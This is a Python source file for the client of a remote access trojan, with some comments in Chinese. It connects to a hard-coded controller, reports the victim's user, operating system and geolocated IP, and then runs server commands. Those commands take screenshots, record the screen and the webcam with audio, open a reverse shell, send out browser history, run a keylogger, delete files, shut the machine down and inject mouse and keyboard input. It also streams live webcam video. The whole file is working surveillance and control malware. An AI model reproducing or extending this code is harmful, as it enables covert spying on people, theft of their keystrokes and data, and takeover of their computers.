import socket
import subprocess
import platform
import os
from getpass import getuser
from screenshot import screenshot
from camera_record import record_video_with_audio
from reverse_shell import handle_reverse_shell
from screen_recording import record_screen
from web_history import extract_and_send_history
from keylogger import start_keylogger, stop_keylogger  # Import keylogger functions
from remote_control_keyboard import type_key_at_mouse_position
from mouse_control import handle_mouse_control
import requests
import cv2
import threading
import numpy as np


def fetch_ip_info():
    """Fetch and return IP address details from the API."""
    ip_address = requests.get('https://api.ipify.org').text  # Obtain public IP address
    # print(ip_address)
    url = f'http://ip-api.com/json/{ip_address}'
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise HTTPError for bad responses
        return response.json()
    except requests.RequestException as e:
        print(f"Error fetching IP details: {e}")
        return None

def execute_script(script_name):
    """Execute the given script."""
    script_path = os.path.join(os.path.dirname(__file__), script_name)
    try:
        result = subprocess.run(['python', script_path], check=True, text=True, capture_output=True)
        print(f"Script output: {result.stdout}")
    except subprocess.CalledProcessError as e:
        print(f"Script execution failed, error: {e.stderr}")
    except FileNotFoundError:
        print(f"File not found: {script_path}")

def send_video_stream(host, port):
    cap = cv2.VideoCapture(0)  # Capture from default camera

    # Set up client socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    while True:
        ret, frame = cap.read()
        if not ret:
            break

        # Convert frame to bytes
        frame = cv2.resize(frame, (640, 480))  # Adjust size as needed
        frame_bytes = frame.tobytes()
        frame_size = len(frame_bytes)

        # Send frame size and frame data
        client_socket.send(frame_size.to_bytes(4, byteorder='big'))
        client_socket.send(frame_bytes)

    cap.release()
    client_socket.close()

def client_program():
    get_os = platform.uname()[0]
    get_user = getuser()

    ip_info = fetch_ip_info()
    if ip_info:
        ip_address = ip_info.get('query', 'Unknown')
        country = ip_info.get('country', 'Unknown')
        city = ip_info.get('city', 'Unknown')
        # isp = ip_info.get('isp', 'Unknown')

    # 组合操作系统信息和 IP 详细信息
    os_info = f"{get_user} <-> {get_os} <-> {ip_address} <-> {country} <-> {city}"
    # print(os_info)

    #host = '140.136.15.165'
    host = '172.20.10.2'
    #host = '192.168.56.1'
    port = 50001

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    client_socket.send(os_info.encode())

    while True:
        message = client_socket.recv(1024).decode()  # Receive server message
        if message == '1':
            num_screenshots = int(client_socket.recv(1024).decode())  # Receive number of screenshots
            screenshot(client_socket, num_screenshots)
        elif message == '2':
            s_duration = int(client_socket.recv(1024).decode())  # Receive number of duration
            record_screen(duration=s_duration, client_socket=client_socket)  # Record and send file
        elif message == '3':
            c_duration = int(client_socket.recv(1024).decode())  # Receive number of duration
            record_video_with_audio(client_socket, duration=c_duration)  # Record 10 seconds of video and audio
        elif message == '4':
            handle_reverse_shell(client_socket)  # Handle reverse shell
        elif message == '5':
            extract_and_send_history(client_socket)  # Extract and send web history
        elif message == '6':
            start_keylogger()  # 啟動鍵盤記錄
        elif message == '7':
            stop_keylogger(client_socket)  # 停止鍵盤記錄
        elif message == '8':
            execute_script('file_delete.py')
        elif message == '9':
            execute_script('close.py')  # Execute shutdown script
        elif message == '0':
            break
        elif message == '10':
            while True:
                mouse_command = client_socket.recv(1024).decode()
                if mouse_command.lower() == 'exit':
                    break
                handle_mouse_control(mouse_command)
        elif message == 'V':
            video_thread = threading.Thread(target=send_video_stream, args=('172.20.10.2', 5001))
            video_thread.start()
        try:
            event_type, key = message.split(':', 1)  # Split only once
            if key.startswith('Key.'):
                key = key[4:]
            type_key_at_mouse_position(event_type, key)
        except ValueError:
            # Silently handle parsing errors
            pass

    client_socket.close()

if __name__ == '__main__':
    client_program()